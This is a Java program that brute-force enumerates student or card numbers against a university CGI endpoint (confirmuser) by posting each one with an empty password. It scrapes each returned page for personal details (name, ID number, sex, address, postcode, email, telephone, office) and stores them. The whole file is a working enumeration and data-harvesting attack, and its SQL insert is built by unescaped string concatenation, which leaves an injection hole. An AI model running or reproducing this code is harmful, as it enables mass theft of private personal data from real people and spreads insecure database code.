package qgb.project.ccsu;

import qgb.*;
import qgb.net.HttpRequest;
import qgb.project.JDBC_Test;
import qgb.text.Regex;

public class Lib {
	static String sql;

	public static void main(String[] args) throws Exception {
		// U.print(U.time());
		JDBC_Test.getConnection();

		for (int i =1; i < 50; i++) {
			for (int j =1; j < 55; j++) {
				for (int j2 = 0; j2 <14; j2++) {
					for (int k = 1; k < 14; k++) {
						get_info(Integer.valueOf("20"
								+T.formatNum(j2,"00")+ T.formatNum(k, "00")
								+ T.formatNum(j+24, "00")+T.formatNum(i, "00")));
					} 

				}


 			}
		}
		// JDBC_Test.query();
		// HttpRequest hr=new HttpRequest();
		// String str= hr.sendPost(
		// "http://172.16.32.11/cgi-bin/confirmuser",
		// "v_newuser=1&v_regname=&v_cardno=11077" + 2009041103 + "&v_passwd=");
		//
		// U.print(str);

		// U.print("(?<=<input type=hidden name=v_office size=\"20\" value=).{1,50}(?= >)");
		// get_info(2009041103);
		// for (int j = 1; j < 13; j++) {
		// for (int i = 0; i < 5; i++) {
		// get_info(Integer.valueOf("2009"+T.format(j,"00")+(1101+i)));
		// }
		//
		// }

	}

	public static void get_info(int ai) {

		String str = HttpRequest.post(
				"http://172.16.32.11/cgi-bin/confirmuser",
				"v_newuser=1&v_regname=&v_cardno=11077" + ai + "&v_passwd=");
		// U.write(ai+".html", str);
		String st_num = "", st_name = "", st_id = "", st_sex = "", st_addr = "", st_zip = "", st_emai = "", st_tele = "", st_offi = "", st_good;
		// System.out.println(sr);
		// U.write("2005.html", sr);
		st_num = Regex
				.getFirst(
						"(?<=<input type=hidden name=v_cardno value=11077)\\d{10}",
						str);
		st_name = Regex
				.getFirst(
						"(?<=<input type=hidden name=v_name size=\"20\" value=).{1,20}(?= >)",
						str);
		if (st_name == "" || Integer.valueOf(st_num) != ai) {
			U.print(ai + " empty!" + st_num);
			return;
		}
		st_id = Regex
				.getFirst(
						"(?<=<input type=\"text\" name=\"v_id\"  size=\"20\" value=\").{10,20}(?=\" ></td>)",
						str);
		st_sex = Regex
				.getFirst(
						"(?<=<select size=\"1\" name=\"v_sex\">).{61}(?=</select></td>)",
						str);
		st_sex = Regex
				.getFirst("(?<=selected>).{1}(?=</option>)", st_sex);
		st_addr = Regex
				.getFirst(
						"(?<=<input type=\"text\" name=\"v_address\" size=\"20\" value=\").{1,50}(?=\" ></td>)",
						str);
		st_zip = Regex
				.getFirst(
						"(?<=<input type=\"text\" name=\"v_zip\" size=\"20\" value=\").{1,10}(?=\" ></td>)",
						str);
		st_emai = Regex
				.getFirst(
						"(?<=<input type=\"text\" name=\"v_email\" size=\"20\" value=\").{1,50}(?=\" ></td>)",
						str);
		st_tele = Regex
				.getFirst(
						"(?<=<input type=\"text\" name=\"v_telephone\" size=\"20\" value=\").{1,50}(?=\"></td>)",
						str);
		st_offi = Regex
				.getFirst(
						"(?<=<input type=hidden name=v_office size=\"20\" value=).{1,50}(?=/td>)",
						str);
		st_offi = st_offi.substring(0, st_offi.indexOf(">"));

		st_offi = st_offi.trim();
		st_good = Regex
				.getFirst(
						"(?<=<input type=\"text\" name=\"v_goodat\" size=\"20\" value=\").{1,50}(?=\" ></td>)",
						str);

		// st_name=Regex.getFirst(, str);
		// U.print("(?<=<input type=\"text\" name=\"v_id\"  size=\"20\" value=\").*(?=\" >)");
		// U.print(st_num);
		// U.print(st_name);
		// U.print(st_id);
		// U.print(st_sex);
		// U.print(st_addr);
		// U.print(st_zip);
		// U.print(st_emai);
		// U.print(st_tele);
		// U.print(st_offi);
		// U.print(st_good);

		sql = "INSERT INTO lib (inum,st_name,st_id,st_sex,st_addr,st_zip,st_emai,st_tele,st_offi,st_good) "
				+ "VALUES ("
				+ st_num
				+ ",'"
				+ st_name
				+ "','"
				+ st_id
				+ "','"
				+ st_sex
				+ "','"
				+ st_addr
				+ "','"
				+ st_zip
				+ "','"
				+ st_emai
				+ "','" + st_tele + "','" + st_offi + "','" + st_good + "');";
		U.print(sql);
		// JDBC_Test.getConnection();
		JDBC_Test.SQL_execute(sql);
	}

}
